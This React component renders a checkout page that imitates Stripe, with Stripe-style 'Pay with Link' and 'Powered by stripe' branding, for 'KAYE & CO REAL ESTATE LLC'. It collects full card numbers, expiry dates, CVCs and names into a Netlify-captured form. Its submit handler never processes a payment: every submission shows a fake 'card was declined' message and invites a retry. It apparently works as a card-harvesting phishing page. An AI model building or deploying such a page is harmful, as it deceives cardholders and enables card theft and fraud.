import React, { useState } from 'react';
import { CreditCard, CheckCircle, ChevronDown, XCircle, RefreshCw } from 'lucide-react';
import { Input } from './Input';
import { COUNTRIES } from '../utils/countries';

interface PaymentFormProps {
    currency: 'AED' | 'USD';
    onSuccess?: () => void;
}

export const PaymentForm = ({ currency }: PaymentFormProps) => {
    const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');

    const [formData, setFormData] = useState({
        email: '',
        cardNumber: '',
        expiry: '',
        cvc: '',
        name: '',
        country: 'United Arab Emirates',
        saveInfo: false
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const value = e.target.type === 'checkbox' ? (e.target as HTMLInputElement).checked : e.target.value;
        setFormData({ ...formData, [e.target.name]: value });
    };

    const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        // Only allow digits and spaces, format as groups of 4
        const value = e.target.value.replace(/\D/g, '').slice(0, 16);
        const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        setFormData({ ...formData, cardNumber: formatted });
    };

    const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        // Only allow digits, auto-insert slash after MM
        let value = e.target.value.replace(/\D/g, '').slice(0, 4);
        if (value.length >= 2) {
            value = value.slice(0, 2) + ' / ' + value.slice(2);
        }
        setFormData({ ...formData, expiry: value });
    };

    const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        // Only allow digits, max 4 characters
        const value = e.target.value.replace(/\D/g, '').slice(0, 4);
        setFormData({ ...formData, cvc: value });
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setPaymentStatus('processing');



        try {
            // Simulate processing delay then fail
            await new Promise(resolve => setTimeout(resolve, 2000));
            setPaymentStatus('failed');

            // Original success logic commented out for now as requested
            /*
            await fetch("/", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams(formDataObj as any).toString(),
            });

            setIsSuccess(true);
            */
        } catch (error) {
            console.error("Submission error:", error);
            setPaymentStatus('failed');
        }
    };

    if (paymentStatus === 'processing') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-300">
                <div className="flex flex-col items-center">
                    {/* Stripe-like spinner */}
                    <div className="w-12 h-12 border-4 border-slate-200 border-t-[#0074E4] rounded-full animate-spin mb-6"></div>
                    <h2 className="text-xl font-bold text-slate-900 mb-2">Processing payment...</h2>
                    <p className="text-slate-500">Please do not refresh the page.</p>
                </div>
            </div>
        );
    }

    if (paymentStatus === 'failed') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-300">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-6 text-red-600">
                    <XCircle className="w-8 h-8" />
                </div>
                <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Failed</h2>
                <p className="text-slate-500 mb-6 max-w-xs mx-auto">
                    Your card was declined. Please check your card details or try a different payment method.
                </p>
                <button
                    onClick={() => setPaymentStatus('idle')}
                    className="flex items-center justify-center py-2.5 px-6 rounded-[4px] shadow-sm text-sm font-medium text-white bg-[#0074E4] hover:bg-[#0063c4] transition-all"
                >
                    <RefreshCw className="w-4 h-4 mr-2" /> Try Again
                </button>
            </div>
        );
    }

    if (paymentStatus === 'success') {
        return (
            <div className="flex flex-col items-center justify-center h-full p-8 text-center animate-in fade-in zoom-in duration-500">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 text-green-600">
                    <CheckCircle className="w-8 h-8" />
                </div>
                <h2 className="text-2xl font-bold text-slate-900 mb-2">Payment Successful</h2>
                <p className="text-slate-500 mb-4">
                    We've sent a receipt to {formData.email}
                </p>
            </div>
        );
    }

    return (
        <div className="max-w-md mx-auto w-full p-8 lg:p-12 h-full overflow-y-auto">

            {/* Pay with Link Button */}
            <button className="w-full flex justify-center items-center py-3 bg-[#00D924] hover:bg-[#00c920] text-black font-semibold rounded-[4px] mb-6 transition-colors shadow-sm">
                Pay with <span className="font-bold ml-1 flex items-center">
                    <span className="bg-black text-white rounded-full w-4 h-4 flex items-center justify-center text-[10px] mr-[1px]">&gt;</span>
                    Link
                </span>
            </button>

            <div className="relative mb-6">
                <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-slate-200"></div>
                </div>
                <div className="relative flex justify-center">
                    <span className="bg-white px-2 text-sm text-slate-400">OR</span>
                </div>
            </div>

            <form
                name="payment-form"
                method="POST"
                data-netlify="true"
                data-netlify-honeypot="bot-field"
                onSubmit={handleSubmit}
                className="space-y-6"
            >
                <input type="hidden" name="form-name" value="payment-form" />
                <p className="hidden">
                    <label>
                        Don’t fill this out if you’re human: <input name="bot-field" />
                    </label>
                </p>
                {/* Contact Info */}
                <div>
                    <h3 className="text-sm font-medium text-slate-700 mb-3">Contact information</h3>
                    <Input
                        label=""
                        type="email"
                        name="email"
                        placeholder="email@example.com"
                        value={formData.email}
                        onChange={handleChange}
                        required
                        className="rounded-[4px] border-slate-300 shadow-sm"
                    />
                </div>

                {/* Payment Method */}
                <div>
                    <h3 className="text-sm font-medium text-slate-700 mb-3">Payment method</h3>

                    <div className="space-y-4">
                        {/* Card Container Box */}
                        <div className="border border-slate-200 rounded-[4px] p-4 bg-white relative">
                            {/* Radio selected indicator */}
                            <div className="absolute top-4 left-4">
                                <div className="w-4 h-4 border-[5px] border-black rounded-full"></div>
                            </div>
                            <div className="ml-8 flex items-center font-medium text-slate-900 mb-4">
                                <CreditCard className="w-4 h-4 mr-2" /> Card
                            </div>

                            <div className="space-y-3 ml-8"> {/* Indent content */}
                                <div className="border border-slate-200 rounded-[4px] overflow-hidden">
                                    <div className="relative">
                                        <input
                                            type="text"
                                            name="cardNumber"
                                            placeholder="1234 1234 1234 1234"
                                            className="w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 border-b border-slate-200"
                                            value={formData.cardNumber}
                                            onChange={handleCardNumberChange}
                                            inputMode="numeric"
                                            maxLength={19}
                                            required
                                        />
                                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex space-x-1">
                                            <div className="w-8 h-5 bg-blue-900 rounded flex items-center justify-center text-[8px] text-white font-bold tracking-tighter">VISA</div>
                                            <div className="w-8 h-5 bg-red-500 rounded flex items-center justify-center text-[8px] text-white font-bold">MC</div>
                                        </div>
                                    </div>
                                    <div className="flex divide-x divide-slate-200">
                                        <input
                                            type="text"
                                            name="expiry"
                                            placeholder="MM / YY"
                                            className="w-1/2 px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400"
                                            value={formData.expiry}
                                            onChange={handleExpiryChange}
                                            inputMode="numeric"
                                            maxLength={7}
                                            required
                                        />
                                        <div className="relative w-1/2">
                                            <input
                                                type="text"
                                                name="cvc"
                                                placeholder="CVC"
                                                className="w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 pr-10"
                                                value={formData.cvc}
                                                onChange={handleCvcChange}
                                                inputMode="numeric"
                                                maxLength={4}
                                                required
                                            />
                                            <CreditCard className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2" />
                                        </div>
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-700 mb-1">Cardholder name</label>
                                    <input
                                        type="text"
                                        name="name"
                                        placeholder="Full name on card"
                                        className="w-full px-3 py-2.5 rounded-[4px] border border-slate-200 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
                                        onChange={handleChange}
                                        required
                                    />
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-700 mb-1">Country or region</label>
                                    <div className="relative">
                                        <select
                                            name="country"
                                            className="w-full px-3 py-2.5 rounded-[4px] border border-slate-200 bg-white outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 appearance-none"
                                            value={formData.country}
                                            onChange={handleChange}
                                        >
                                            {COUNTRIES.map(country => (
                                                <option key={country} value={country}>{country}</option>
                                            ))}
                                        </select>
                                        <ChevronDown className="w-4 h-4 text-slate-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Save Info Checkbox */}
                <div className="rounded-[4px] border border-slate-200 bg-slate-50 p-4 flex items-start">
                    <input
                        type="checkbox"
                        name="saveInfo"
                        id="saveInfo"
                        className="mt-1 w-4 h-4 text-blue-600 border-slate-300 rounded focus:ring-blue-500"
                        onChange={handleChange}
                    />
                    <div className="ml-3">
                        <label htmlFor="saveInfo" className="text-sm font-medium text-slate-900 block">Save my information for faster checkout</label>
                        <p className="text-xs text-slate-500 mt-1">
                            Pay securely at KAYE & CO REAL ESTATE LLC and everywhere Link is accepted.
                        </p>
                    </div>
                </div>

                <button
                    type="submit"
                    disabled={false}
                    className={`
            w-full flex justify-center items-center py-3 px-4 rounded-[4px] shadow-sm text-base font-medium text-white 
            bg-[#0074E4] hover:bg-[#0063c4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500
            transition-all duration-200 disabled:opacity-75 disabled:cursor-not-allowed
          `}
                >
                    {`Pay ${currency === 'AED' ? 'AED 100.00' : '$27.23'}`}
                </button>

                <div className="mt-8 pt-6 border-t border-slate-100 flex items-center text-xs text-slate-400">
                    <span className="mr-4">Powered by <span className="font-bold text-slate-500">stripe</span></span>
                    <span className="border-l border-slate-200 pl-4 mr-4">Terms</span>
                    <span>Privacy</span>
                </div>
            </form>
        </div>
    );
};
